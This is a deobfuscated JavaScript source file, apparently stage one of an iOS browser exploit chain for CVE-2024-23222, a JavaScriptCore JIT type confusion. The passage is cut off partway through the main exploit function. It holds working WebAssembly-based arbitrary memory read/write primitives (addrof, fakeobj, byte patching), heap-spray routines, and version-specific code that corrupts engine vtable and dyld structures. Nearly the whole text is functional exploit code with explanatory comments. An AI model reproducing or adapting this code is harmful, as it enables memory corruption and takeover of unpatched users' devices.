/**
 * Stage 1: WebAssembly Memory Primitives (Deobfuscated)
 * Original hash: 8c4451cf1258f9a8d6a8af27864f111fd69a0e99
 *
 * This module implements the core exploit primitives for CVE-2024-23222 using
 * WebAssembly memory corruption. Two WASM primitive classes provide arbitrary
 * read/write capabilities by exploiting a JIT type confusion in JavaScriptCore.
 *
 * Key capabilities:
 *   - WasmPrimitive64 (J): 64-byte WASM instance for iOS >= 16.4 (64 iterations)
 *   - WasmPrimitive16 ($): 16-byte WASM instance for iOS < 16.4 (16 iterations)
 *   - Arbitrary memory read (Ki/br) and write (Hi/Bs) via WASM instance corruption
 *   - addrof (tA/tr) - get address of JS object, fakeobj (Mr) - create fake object
 *   - JIT function compilation forcing via megamorphic calls + dead-code bloat
 *   - Heap spray (allocateBuffers) and GC pressure (triggerJIT) for exploitation setup
 *   - exploitMain (L) - full exploit flow: type confusion → addrof/fakeobj → r/w primitive
 *
 * Module dependencies:
 *   - 57620206d62079baad0e57e6d9ec93120c0f5247 (utility_module.js)
 *   - 14669ca3b1519ba2a8f40be287f646d4d7593eb0 (platform_module.js)
 */

let r = {};

// ════════════════════════════════════════════════════════════════════════════
// Module imports
// ════════════════════════════════════════════════════════════════════════════

const {
    N: G, // toHexString
    tn: W, // assert
    nn: C, // TypeHelper
    Vt: m, // Int64
    U: j, // toBigInt
    An: S, // unsignedBigIntToNumber
    vn: O, // unused/debug
    v: o, // MAX_SAFE_HI32 (127)
    I: u, // POINTER_MASK (0x7FFFFFFFFF)
    B: s // POINTER_TAG_SHIFT (39)
  } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),

  /** Platform state — provides version thresholds and runtime-specific offsets */
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
  /** Utility module full reference (for Int64, conversion helpers) */
  utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");

// ════════════════════════════════════════════════════════════════════════════
// WasmPrimitive64 — 64-byte WASM-based read/write primitive (iOS >= 16.04)
// ════════════════════════════════════════════════════════════════════════════

/**
 * WASM-based memory read/write primitive using a 64-byte WASM module.
 * Used on iOS >= 16.4 where the WASM instance layout requires larger corruption window.
 *
 * The WASM module exports:
 *   - btl(): read function (returns bigint from corrupted memory)
 *   - alt(v): write function (stores bigint v to corrupted memory)
 *
 * Two separate WebAssembly instances are created from the same module:
 *   - es/ss: paired instances for read/write operations
 *   - The [0]=3 assignment places a JS value into WASM linear memory
 *   - os array is used as a GC-visible container for addrof operations
 */
class J /* WasmPrimitive64 */ {

  /** Get Int64 address of a JS object (addrof). Original: tr */
  addrof(t) {
    return utilityModule.K(this.getObjectAddress(t));
  }

  /** Read a string from an Int64 address, up to `e` bytes. Original: Tr */
  readStringFromInt64(t, e = 256) {
    const r = utilityModule.O(t.yt());
    return this.readString(r, e);
  }

  /** Read an Int64 value from a numeric byte offset. Original: rr */
  readInt64FromOffset(t) {
    const e = this.read32(utilityModule.O(t)),
      r = this.read32(utilityModule.O(t + 4));
    return new utilityModule.Int64(e, r);
  }

  /** Read a 32-bit value from an Int64 address. Original: ir */
  read32FromInt64(t) {
    return this.read32(utilityModule.O(t.yt()));
  }

  /** Read an Int64 value from an Int64 address. Original: Ur */
  readInt64FromInt64(t) {
    return this.readInt64FromOffset(t.yt());
  }

  /** Write an Int64 value to a numeric offset. Original: Jr */
  writeInt64ToOffset(t, e) {
    const r = utilityModule.O(t),
      n = e.Nt();
    this.write64(r, n);
  }

  /**
   * Read a double (reinterpreted as pointer) from a numeric offset.
   * If `e` is true or platform flag zohDDd is set, mask with MAX_SAFE_HI32.
   * Original: Dr
   */
  readDoubleAsPointer(t, e = !1) {
    const r = this.read32(utilityModule.O(t));
    let n = this.read32(utilityModule.O(t + 4));
    return (!0 === e || platformModule.platformState.versionFlags.zohDDd) && (n &= o), utilityModule.T(r, n);
  }

  /** Read the raw BigInt value at an Int64's byte offset. Original: nr */
  readRawBigInt(t) {
    return this.readInt64FromOffset(t).yt();
  }

  /** Busy-wait spin loop (768 iterations, stepping by 8). Original: hr */
  busyWait(t, e = 768) {
    for (let t = 0; t < e; t += 8);
  }

  /** Copy a BigInt between two numeric offsets. Original: ti */
  copyBigInt(t, e) {
    this.write64(utilityModule.O(t), utilityModule.O(e));
  }

  /**
   * Get the buffer address (fakeobj) — create a fake JSObject from an ArrayBuffer
   * by reading the platform-specific offset (iWQGB1) from the object header.
   * Original: Mr
   */
  fakeobj(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return utilityModule.K(S(this.read64(e + j(platformModule.platformState.versionFlags.iWQGB1))));
  }

  /**
   * Execute callback `t` with temporary pointer overrides.
   * Saves original values at each entry's .Ir offset, writes the .Zt values,
   * calls t(), then restores originals. Original: Br
   */
  withTempOverrides(t, ...e) {
    const r = new Array(e.length + 10);
    for (let t = 0; t < e.length; t++) r[t] = this.readInt64FromOffset(e[t].Ir);
    try {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, e[t].Zt);
      t();
    } finally {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, r[t]);
    }
  }

  constructor() {
    /**
     * WASM module bytes — this is a valid WebAssembly binary.
     * Header: [0x00, 0x61, 0x73, 0x6d] = "\0asm" magic
     * Version: [0x01, 0x00, 0x00, 0x00] = version 1
     *
     * The module defines:
     *   - 2 function types (read/write signatures)
     *   - 1 memory (with initial/max page counts)
     *   - Exported functions "btl" (read) and "alt" (write)
     *   - Data segment with padding (0x33 fill) for corruption target
     *   - Multiple global variables used as read/write targets
     *
     * XOR-decoded bytes spell out "asm" header + "memory" + "btl" + "alt" export names.
     */
    const t = new Uint8Array([
      0, 97, 115 /* "s" */, 109 /* "m" */, 1, 0, 0, 0, // \0asm v1
      1, 9, 2, 96, 0, 1, 126 /* i64 */, 96, 1, 126 /* i64 */, 0,
      3, 3, 2, 0, 1,
      4, 4, 1, 111 /* funcref */, 0, 1,
      5, 3, 1, 0, 1,
      6, 82, 8, // 8 globals section
      123 /* i64.const */, 1, 253, 12, // global 0: i64 with padding
      51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51,
      11, 126 /* i64.const */, 1, 66,
      205, 215, 182, 222, 218, 249, 234, 230, 171, 127,
      11, 123 /* i64.const */, 1, 253, 12,
      51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51,
      11, 111 /* f64.const */, 1, 208, 111,
      11, 111, 1, 208, 111,
      11, 111, 1, 208, 111,
      11, 111, 1, 208, 111,
      11, 111, 1, 208, 111,
      11,
      7, 29, 4, 4,
      101, 100, 102, 121, // "edfy" — export descriptor
      3, 1, 6,
      109, 101, 109, 111, 114, 121, // "memory"
      2, 0, 3,
      98, 116, 108, // "btl" (read export)
      0, 0, 3,
      97, 108, 116, // "alt" (write export)
      0, 1,
      10, 13, 2, 4, 0, 35, 1, 11, // btl: global.get 1; end
      6, 0, 32, 0, 36, 1, 11 // alt: local.get 0; global.set 1; end
      ]),
      e = (t) => t.exports.btl(),
      r = (t, e) => {t.exports.alt(e);};

    this.ts = []; // GC roots to prevent collection of allocated buffers

    const n = new WebAssembly.Module(t, {});
    // Create two WASM instances — one for read, one for write
    this.es = new WebAssembly.Instance(n, {});
    this.es[0] = 3; // Place JS value at index 0 (triggers type confusion)
    this.rs = e.bind(null, this.es); // read from instance A
    this.ns = r.bind(null, this.es); // write to instance A

    this.ss = new WebAssembly.Instance(n, {});
    this.ss[0] = 3;
    this.ls = e.bind(null, this.ss); // read from instance B
    this.hs = r.bind(null, this.ss); // write to instance B

    // os is a special array used for addrof: place object at [0], read address
    this.os = [{}, 1, 8];
    this.os.q23 = 90; // Named property to change array storage mode

    // Scratch buffers for type punning (double <-> uint32 <-> bigint)
    this.Qi = new ArrayBuffer(16);
    this.fs = new Uint32Array(this.Qi);
    this.cs = new BigUint64Array(this.Qi);
    this.bs = new ArrayBuffer(32);
    this.us = new DataView(this.bs);

    this.Oi = new C(); // TypeHelper instance

    // Warm up: 1 iteration (minimal JIT warmup for 64-byte variant)
    const i = 0n;
    for (let t = 0; t < 1; t++) this.rs(), this.ls(), this.ns(i), this.hs(i);
  }

  /**
   * Store five converted BigInt addresses for the exploit state.
   * These offsets point to key data structures in the corrupted memory.
   * Original: gs
   */
  storeExploitState(t, e, r, n, i) {
    this.ws = this.Oi.Bn(t);
    this.ds = this.Oi.Bn(e);
    this.ys = this.Oi.Bn(r);
    this.As = this.Oi.Bn(n);
    this.Us = this.Oi.Bn(i);
  }

  /** No-op placeholder. Original: zr */
  cleanup() {}

  /** Write BigInt value t to instance A. Original: Wi */
  writeToInstanceA(t) {this.ns(t);}

  /** Write then read: set value t, return read result. Original: _s */
  writeAndRead(t) {return this.writeToInstanceA(t), this.ls();}

  /** Write then write: set addr t, store value e. Original: Bs */
  writeAndWrite(t, e) {return this.writeToInstanceA(t), this.hs(e);}

  /** Read a 64-bit value at BigInt address t. Original: Ki */
  read64(t) {return this.cs[0] = this.writeAndRead(t), this.cs[0];}

  /**
   * Get the backing store address of a TypedArray/ArrayBuffer.
   * Reads platform-specific offset oGn3OG from the object.
   * Original: Ts
   */
  getBackingStore(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    t instanceof DataView && (t = new Uint8Array(t.buffer));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + BigInt(platformModule.platformState.versionFlags.oGn3OG)));
  }

  /**
   * Get the JIT code pointer for a Function object.
   * Reads platform-specific offset KaU4Z7 from the function.
   * Original: ps
   */
  getJITCodePointer(t) {
    if (!(t instanceof Function)) throw new Error("!(t instanceof Function)");
    const e = this.getObjectAddress(t);
    return this.read64(e + BigInt(platformModule.platformState.versionFlags.KaU4Z7));
  }

  /**
   * Write a 32-bit value at a BigInt address.
   * Preserves the upper 32 bits while replacing the lower 32 bits.
   * Original: dr
   */
  write32(t, e) {
    if ("bigint" != typeof t) return this.write32(utilityModule.O(t), e);
    {
      const r = this.read64(t);
      this.cs[0] = r;
      this.fs[0] = e;
      const n = this.cs[0];
      this.writeAndWrite(t, n);
    }
  }

  /**
   * Allocate a null-terminated C string in WASM memory.
   * Returns [Uint8Array, address].
   * Original: ks
   */
  allocCString(t) {
    const e = new Uint8Array(new ArrayBuffer(t.length + 1));
    for (let r = 0; r < t.length; r++) e[r] = t.charCodeAt(r);
    return [e, this.getDataPointer(e)];
  }

  /**
   * Allocate a zeroed buffer of t bytes, return its address.
   * Original: Ms
   */
  allocZeroBuffer(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), r;
  }

  /**
   * Allocate a zeroed buffer of t bytes, return [Uint8Array, address].
   * Original: Is
   */
  allocZeroBufferPair(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), [e, r];
  }

  /**
   * Get the data pointer (backing store + 0x10) of a typed array buffer.
   * Original: Ss
   */
  getDataPointer(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + 0x10n));
  }

  /**
   * Patch a single byte at BigInt address t — read the 64-bit value, replace
   * byte 0 with `e`, write back.
   * Original: Ps
   */
  patchByte(t, e) {
    this.us.setBigUint64(0, this.read64(t), !0);
    this.us.setUint8(0, e, !0);
    this.write64(t, this.us.getBigUint64(0, !0));
  }

  /**
   * Read a null-terminated ASCII string from BigInt address t, up to e bytes.
   * Original: Er
   */
  readString(t, e = 768) {
    let r = t;
    "number" == typeof t && (r = utilityModule.O(t));
    let n = "";
    for (let t = 0; t < e; t++) {
      const e = this.readByte(r + BigInt(t));
      if (0 === e) break;
      n += String.fromCharCode(e);
    }
    return n;
  }

  /** Read a single byte (& 0xFF) from BigInt address t. Original: Sr */
  readByte(t) {return 255 & this.read32(t);}

  /** Read a 32-bit value from BigInt or number address. Original: br */
  read32(t) {
    return "bigint" == typeof t ? (
    this.cs[0] = this.writeAndRead(t), this.fs[0]) :
    this.read32(utilityModule.O(t));
  }

  /** Write a 64-bit BigInt value at BigInt address t. Original: Hi */
  write64(t, e) {return this.writeAndWrite(t, e);}

  /**
   * addrof primitive: place object t into the os array at index 0,
   * then read the object's address from WASM-corrupted memory.
   * Original: tA
   */
  getObjectAddress(t) {
    this.os[0] = t;
    const e = this.read64(this.Us + 0x8n),
      r = this.read64(e);
    return this.os[0] = null, r;
  }
}

// ════════════════════════════════════════════════════════════════════════════
// WasmPrimitive16 — 16-byte WASM-based read/write primitive (iOS < 16.04)
// ════════════════════════════════════════════════════════════════════════════

/**
 * WASM-based memory read/write primitive using a smaller 16-byte WASM module.
 * Used on iOS < 16.4 where the WASM instance layout is more compact.
 *
 * Structurally identical to WasmPrimitive64 (J) with two key differences:
 *   1. The WASM binary is smaller (fewer globals/data, 16-byte segments)
 *   2. JIT warmup uses 22 iterations instead of 1
 *   3. Has additional allocControlledBuffer() method for controlled ArrayBuffer allocation
 *   4. Has copyMemory32() method for 32-bit aligned memory copy
 */
class $ /* WasmPrimitive16 */ {

  /** Get Int64 address of a JS object (addrof). Original: tr */
  addrof(t) {return utilityModule.K(this.getObjectAddress(t));}

  /** Read a string from an Int64 address. Original: Tr */
  readStringFromInt64(t, e = 256) {
    const r = utilityModule.O(t.yt());
    return this.readString(r, e);
  }

  /** Read an Int64 value from a numeric byte offset. Original: rr */
  readInt64FromOffset(t) {
    const e = this.read32(utilityModule.O(t)),
      r = this.read32(utilityModule.O(t + 4));
    return new utilityModule.Int64(e, r);
  }

  /** Read a 32-bit value from an Int64 address. Original: ir */
  read32FromInt64(t) {return this.read32(utilityModule.O(t.yt()));}

  /** Read an Int64 value from an Int64 address. Original: Ur */
  readInt64FromInt64(t) {return this.readInt64FromOffset(t.yt());}

  /** Write an Int64 value to a numeric offset. Original: Jr */
  writeInt64ToOffset(t, e) {
    const r = utilityModule.O(t),
      n = e.Nt();
    this.write64(r, n);
  }

  /** Read a double (reinterpreted as pointer) from a numeric offset. Original: Dr */
  readDoubleAsPointer(t, e = !1) {
    const r = this.read32(utilityModule.O(t));
    let n = this.read32(utilityModule.O(t + 4));
    return (!0 === e || platformModule.platformState.versionFlags.zohDDd) && (n &= o), utilityModule.T(r, n);
  }

  /** Read the raw BigInt at an Int64's byte offset. Original: nr */
  readRawBigInt(t) {return this.readInt64FromOffset(t).yt();}

  /** Busy-wait spin loop (768 iterations). Original: hr */
  busyWait(t, e = 768) {for (let t = 0; t < e; t += 8);}

  /** Copy a BigInt between two numeric offsets. Original: ti */
  copyBigInt(t, e) {this.write64(utilityModule.O(t), utilityModule.O(e));}

  /** Get the buffer address (fakeobj). Original: Mr */
  fakeobj(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return utilityModule.K(S(this.read64(e + j(platformModule.platformState.versionFlags.iWQGB1))));
  }

  /** Execute callback with temporary pointer overrides. Original: Br */
  withTempOverrides(t, ...e) {
    const r = new Array(e.length + 10);
    for (let t = 0; t < e.length; t++) r[t] = this.readInt64FromOffset(e[t].Ir);
    try {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, e[t].Zt);
      t();
    } finally {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, r[t]);
    }
  }

  constructor() {
    /**
     * Smaller WASM module (16-byte layout) for older iOS versions.
     * Same structure as J's module but with fewer globals and data segments:
     *   - 3 globals instead of 8
     *   - No large padding data segments
     *   - Export names: "memory", "btl" (read), "alt" (write)
     */
    const t = new Uint8Array([
      0, 97, 115 /* "s" */, 109 /* "m" */, 1, 0, 0, 0, // \0asm v1
      1, 9, 2, 96, 0, 1, 126 /* i64 */, 96, 1, 126 /* i64 */, 0,
      3, 3, 2, 0, 1,
      4, 4, 1, 111 /* funcref */, 0, 1,
      5, 3, 1, 0, 1,
      6, 16, 3, // 3 globals
      126 /* i64.const */, 1, 66, 0, 11,
      126 /* i64.const */, 1, 66, 0, 11,
      126 /* i64.const */, 1, 66, 0, 11,
      7, 22, 3, 6,
      109, 101, 109, 111, 114, 121, // "memory"
      2, 0, 3,
      98, 116, 108, // "btl" (read export)
      0, 0, 3,
      97, 108, 116, // "alt" (write export)
      0, 1,
      10, 13, 2, 4, 0, 35, 0, 11, // btl: global.get 0; end
      6, 0, 32, 0, 36, 0, 11 // alt: local.get 0; global.set 0; end
      ]),
      e = (t) => t.exports.btl(),
      r = (t, e) => {t.exports.alt(e);};

    this.ts = [];

    const n = new WebAssembly.Module(t, {});
    this.es = new WebAssembly.Instance(n, {});
    this.es[0] = 3;
    this.rs = e.bind(null, this.es);
    this.ns = r.bind(null, this.es);

    this.ss = new WebAssembly.Instance(n, {});
    this.ss[0] = 3;
    this.ls = e.bind(null, this.ss);
    this.hs = r.bind(null, this.ss);

    this.os = [{}, 1, 8];
    this.os.q23 = 90;

    this.Qi = new ArrayBuffer(16);
    this.fs = new Uint32Array(this.Qi);
    this.cs = new BigUint64Array(this.Qi);
    this.bs = new ArrayBuffer(32);
    this.us = new DataView(this.bs);

    this.Oi = new C();

    // Warm up: 22 iterations (more warmup needed for 16-byte variant)
    const i = 0n;
    for (let t = 0; t < 22; t++) this.rs(), this.ls(), this.ns(i), this.hs(i);
  }

  /** Store five converted BigInt addresses. Original: gs */
  storeExploitState(t, e, r, n, i) {
    this.ws = this.Oi.Bn(t);
    this.Ws = this.Oi.Bn(e);
    this.ys = this.Oi.Bn(r);
    this.js = this.Oi.Bn(n);
    this.Us = this.Oi.Bn(i);
  }

  cleanup() {}
  writeToInstanceA(t) {this.ns(t);}
  writeAndRead(t) {return this.writeToInstanceA(t), this.ls();}
  writeAndWrite(t, e) {return this.writeToInstanceA(t), this.hs(e);}
  read64(t) {return this.cs[0] = this.writeAndRead(t), this.cs[0];}

  /** Get backing store address. Original: Ts */
  getBackingStore(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    t instanceof DataView && (t = new Uint8Array(t.buffer));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + BigInt(platformModule.platformState.versionFlags.oGn3OG)));
  }

  /** Get JIT code pointer for a Function. Original: ps */
  getJITCodePointer(t) {
    if (!(t instanceof Function)) throw new Error("!(t instanceof Function)");
    const e = this.getObjectAddress(t);
    return this.read64(e + BigInt(platformModule.platformState.versionFlags.KaU4Z7));
  }

  /** Write a 32-bit value at address. Original: dr */
  write32(t, e) {
    if ("bigint" != typeof t) return this.write32(utilityModule.O(t), e);
    {
      const r = this.read64(t);
      this.cs[0] = r;
      this.fs[0] = e;
      const n = this.cs[0];
      this.writeAndWrite(t, n);
    }
  }

  /** Allocate null-terminated C string. Original: ks */
  allocCString(t) {
    const e = new Uint8Array(new ArrayBuffer(t.length + 1));
    for (let r = 0; r < t.length; r++) e[r] = t.charCodeAt(r);
    return [e, this.getDataPointer(e)];
  }

  /** Allocate zeroed buffer, return address. Original: Ms */
  allocZeroBuffer(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), r;
  }

  /**
   * Allocate an ArrayBuffer with controlled JSC metadata.
   * If `e` is true, additionally patches the ArrayBuffer's structure pointer
   * and adjusts the capacity field by +32 bytes (CN3rr_, EMDU4o offsets).
   * This is used to create fake ArrayBuffers with expanded bounds.
   * Original: Or
   */
  allocControlledBuffer(t, e = !1) {
    let r = new ArrayBuffer(t),
      n = new Uint8Array(r);
    utilityModule.D(r); // Push to GC roots
    let i = this.addrof(n),
      s = this.readDoubleAsPointer(i + platformModule.platformState.versionFlags.oGn3OG);
    if (!0 === e) {
      let t = this.addrof(r),
        e = this.readDoubleAsPointer(t + platformModule.platformState.versionFlags.CN3rr_),
        n = this.read32(e + platformModule.platformState.versionFlags.EMDU4o);
      n += 32;
      this.write32(e + platformModule.platformState.versionFlags.EMDU4o, n);
    }
    return s;
  }

  /** Allocate zeroed buffer, return [Uint8Array, address]. Original: Is */
  allocZeroBufferPair(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), [e, r];
  }

  /** Get data pointer of typed array buffer. Original: Ss */
  getDataPointer(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + 0x10n));
  }

  /**
   * Copy memory in 32-bit aligned chunks from source to dest.
   * Original: gr
   */
  copyMemory32(t, e, r) {
    if (r % 4 != 0) throw new Error("r % 4 != 0");
    for (let n = 0; n < r; n += 4)
    this.write32(t.Nt() + BigInt(n), this.read32(e.Nt() + BigInt(n)));
  }

  /** Patch a single byte at address. Original: Ps */
  patchByte(t, e) {
    this.us.setBigUint64(0, this.read64(t), !0);
    this.us.setUint8(0, e, !0);
    this.write64(t, this.us.getBigUint64(0, !0));
  }

  /** Read a null-terminated ASCII string from address. Original: Er */
  readString(t, e = 768) {
    let r = t;
    "number" == typeof t && (r = utilityModule.O(t));
    let n = "";
    for (let t = 0; t < e; t++) {
      const e = this.readByte(r + BigInt(t));
      if (0 === e) break;
      n += String.fromCharCode(e);
    }
    return n;
  }

  /** Read single byte. Original: Sr */
  readByte(t) {return 255 & this.read32(t);}

  /** Read 32-bit value. Original: br */
  read32(t) {
    return "bigint" == typeof t ? (
    this.cs[0] = this.writeAndRead(t), this.fs[0]) :
    this.read32(utilityModule.O(t));
  }

  /** Write 64-bit value. Original: Hi */
  write64(t, e) {return this.writeAndWrite(t, e);}

  /** addrof primitive. Original: tA */
  getObjectAddress(t) {
    this.os[0] = t;
    const e = this.read64(this.Us + 0x8n),
      r = this.read64(e);
    return this.os[0] = null, r;
  }
}

// ════════════════════════════════════════════════════════════════════════════
// Heap preparation helpers
// ════════════════════════════════════════════════════════════════════════════

/**
 * Spray the heap with 240 ArrayBuffers of 4MB each (960MB total).
 * This creates a predictable heap layout to ensure the type confusion
 * lands on controlled memory.
 * Original: V → allocateBuffers
 */
function V /* allocateBuffers */() {
  for (let t = 0; t < 240; t++) new ArrayBuffer(4194304 /* 4MB */);
}

/**
 * Force JIT compilation and GC pressure by allocating a 10M element Uint32Array.
 * The eval() prevents the compiler from optimizing away the allocation.
 * Original: H → triggerJIT
 */
function H /* triggerJIT */() {
  eval("new Uint32Array(10000000);");
}

// ════════════════════════════════════════════════════════════════════════════
// Main exploit function — CVE-2024-23222 type confusion
// ════════════════════════════════════════════════════════════════════════════

/**
 * Main exploit entry point. Triggers the CVE-2024-23222 type confusion
 * to achieve arbitrary read/write through WASM memory corruption.
 *
 * Flow:
 *   1. Heap spray (7000 JSON objects + 240 × 4MB ArrayBuffers)
 *   2. Select WasmPrimitive64 (iOS >= 16.4) or WasmPrimitive16 (older)
 *   3. Create megamorphic dispatch function (7200 × "x += 1" dead code)
 *   4. Build JIT-compiled read/write/length primitives via speculation
 *   5. Trigger type confusion: double array ←→ object array
 *   6. Walk memory backwards (page-aligned) to find Mach-O header (0xFEEDFACF)
 *   7. Return the initialized WASM primitive with full r/w capability
 *
 * Original: L → exploitMain
 * Exported as: r.si
 */
async function L /* exploitMain */(t) {
  window.log(`[STAGE1] === Stage 1: WASM Primitives starting ===`);
  const e = new Float64Array(10),
    r = new Int32Array(e.buffer),
    n = new Array(3000);

  // Heap spray: create 7000 JSON objects to fill JSC nursery
  window.log(`[STAGE1] Heap spray: allocating 7000 JSON objects...`);
  for (let t = 0; t < 7000; t++)
  n[t] = JSON.parse("{\"a" + t + "\": " + t + "}");

  window.log(`[STAGE1] Triggering JIT compilation + GC pressure...`);
  H(); // JIT/GC pressure
  window.log(`[STAGE1] Heap spray: 240 × 4MB ArrayBuffers...`);
  V(); // Heap spray with large ArrayBuffers

  // Exploit state object — sealed to prevent JIT deoptimization
  const i = {
    j: { g: eval("(() => {return -NaN})()") }, // NaN-boxing sentinel
    A: !1, // success flag
    M: e, // Float64Array for type punning
    xs: r, // Int32Array view of same buffer
    Fs: platformModule.platformState.iOSVersion >= 160400 ? new J() : new $(), // WASM primitive (version-dependent)
    Cs: { // Collected exploit state addresses
      vs: null, // dyld image header A
      Ds: null, // dyld image list (pre-16.4)
      Os: null, // dyld image list entry (pre-16.4)
      Ns: null, // dyld image list entry (16.4+)
      Js: null, // dyld callback pointer (16.4+)
      $s: null, // JSC vtable pointer
      Vs: null // auxiliary object reference
    },
    t: [[], [], [], []], // WASM instance references for type confusion
    l: [1.1, 2.2, 3.1], // Double array (will be type-confused with object array)
    i: [.23, 2.2, 3.4], // Alternate double array
    k: null, // version-specific exploit callback
    o: null, // auxiliary object
    m: null, // inlined function reference
    u: null, // megamorphic dispatch function
    Es: null, // JIT speculation function
    h: null, // pointer setup function
    nr: null, // raw read primitive (as double)
    mi: null, // length read primitive
    Gs: null, // raw write primitive
    Hs: new ArrayBuffer(16),
    Ls: null, // Uint32Array view of Hs
    Rs: null, // Float64Array view of Hs
    Ks: 5242880 // 0x500000 — initial offset guess
  };
  Object.seal(i);

  // Build a very large function body to force megamorphic JIT compilation.
  // The dead code (never executed) bloats the function to prevent inlining,
  // which is necessary for the type confusion to work.
  const s = "x += 1; x += 1; x += 1; x += 1; x += 1; x += 1; x += 1;";
  let a = "";
  for (let t = 0; t < 7200; t++) a += s;

  /**
   * Megamorphic dispatch wrapper — calls func(arg0..arg4) through a large
   * function that the JIT must compile in a specific way.
   */
  const l = new Function(
    "func", "arg0", "arg1", "arg2", "arg3", "arg4",
    "\n        if(false) {\n            let x = 0;\n            " + a +
    "\n        }\n\n        return func(arg0, arg1, arg2, arg3, arg4);\n    "
  );

  window.log(`[STAGE1] Built megamorphic dispatch function (7200 dead-code iterations)`);
  i.u = l;
  i.Ls = new Uint32Array(i.Hs);
  i.Rs = new Float64Array(i.Hs);
  i.l.dw34 = 12; // Named property to change butterfly storage
  i.i.x534 = 94;
  i.t[0] = i.Fs.es; // WASM instance A
  i.t[1] = i.Fs.ss; // WASM instance B
  i.t[2] = i.l; // Double array (confusion target)
  i.t[3] = i.Fs.os; // addrof helper array

  const h = { a: 1, b: 2, c: 3, d: 4 };
  i.o = h;
  const o = Symbol();
  let f = [0];

  try {
    /**
     * The exploit IIFE — triggers type confusion and builds primitives.
     *
     * The exploit works by:
     * 1. JIT-compiling several primitive functions (read as double, write as double, etc.)
     * 2. These functions use the megamorphic wrapper to force specific JIT behavior
     * 3. After sufficient warmup, the JIT makes incorrect type assumptions
     * 4. A property getter (n.zs/n.qs) triggers the confusion during Array construction
     * 5. This confuses a double array with an object array
     * 6. Once confused: doubles can be read as object pointers (addrof)
     *    and object pointers can be written as doubles (fakeobj)
     */
    platformModule.platformState.exploitPrimitive = (() => {
      // Version-specific exploit callback — reads JSC internal structures
      // to find vtable pointers, dyld image lists, and callback addresses.
      i.k = platformModule.platformState.iOSVersion >= 160400 ?
      // iOS >= 16.4 path: additional vtable entries at TryHSU + cyTrSt offsets
      function (t, e, r, n) {
        const i = t.u(t.nr, t, e, n + 8),
          s = t.u(t.nr, t, e, i),
          a = t.u(t.nr, t, e, i + 8),
          l = t.u(t.nr, t, e, i + 16),
          h = t.u(t.nr, t, e, i + 24),
          o = t.u(t.nr, t, e, l + 8),
          f = t.u(t.mi, t, e, l);
        t.Ks = f;
        const c = t.u(t.nr, t, e, s + platformModule.platformState.versionFlags.TryHSU),
          b = c + platformModule.platformState.versionFlags.cyTrSt,
          u = t.u(t.nr, t, e, a + platformModule.platformState.versionFlags.TryHSU),
          g = u + platformModule.platformState.versionFlags.cyTrSt,
          w = t.u(t.nr, t, e, b),
          d = t.u(t.nr, t, e, g);
        // Zero out the vtable entries, then store confusing pointer
        t.u(t.Gs, t, e, u + platformModule.platformState.versionFlags.ZHsObe, -0);
        t.u(t.Gs, t, e, c + platformModule.platformState.versionFlags.ZHsObe, -0);
        t.u(t.Gs, t, e, b, 5e-324 * g);
        // Warmup: force JIT to lock in type assumptions
        for (let e = 0; e < 30; e++) t.u(t.nr, t, [1.1], o);
        for (let e = 0; e < 30; e++) t.u(t.Gs, t, [1.1], o, n + 8);
        for (let e = 0; e < 30; e++) t.u(t.mi, t, [1.1], o, 1.234);
        for (let e = 0; e < 30; e++) t.u(t.h, t, o);
        // Save collected addresses
        t.Cs.$s = c;
        t.Cs.Js = w;
        t.Cs.vs = u;
        t.Cs.Ns = d;
        t.Cs.Vs = h;
      } :
      // iOS < 16.4 path: uses FFwSQ4 offset instead of cyTrSt
      (t, e, r, n) => {
        const i = t.u(t.nr, t, e, n + 8),
          s = t.u(t.nr, t, e, i),
          a = t.u(t.nr, t, e, i + 8),
          l = t.u(t.nr, t, e, i + 16),
          h = t.u(t.nr, t, e, i + 24),
          o = t.u(t.nr, t, e, l + 8),
          f = t.u(t.mi, t, e, l);
        t.Ks = f;
        const c = t.u(t.nr, t, e, s + platformModule.platformState.versionFlags.TryHSU),
          b = t.u(t.nr, t, e, a + platformModule.platformState.versionFlags.TryHSU),
          u = b + platformModule.platformState.versionFlags.FFwSQ4,
          g = c + platformModule.platformState.versionFlags.FFwSQ4,
          w = t.u(t.nr, t, e, g),
          d = t.u(t.nr, t, e, u);
        t.u(t.Gs, t, e, g, 5e-324 * u);
        t.u(t.nr, t, [1.1], o);
        t.u(t.Gs, t, [1.1], o, n + 8);
        t.u(t.mi, t, [1.1], o, 1.234);
        for (let e = 0; e < 30; e++) t.u(t.nr, t, [1.1], o);
        for (let e = 0; e < 30; e++) t.u(t.Gs, t, [1.1], o, n + 8);
        for (let e = 0; e < 30; e++) t.u(t.mi, t, [1.1], o, 1.234);
        for (let e = 0; e < 30; e++) t.u(t.h, t, o);
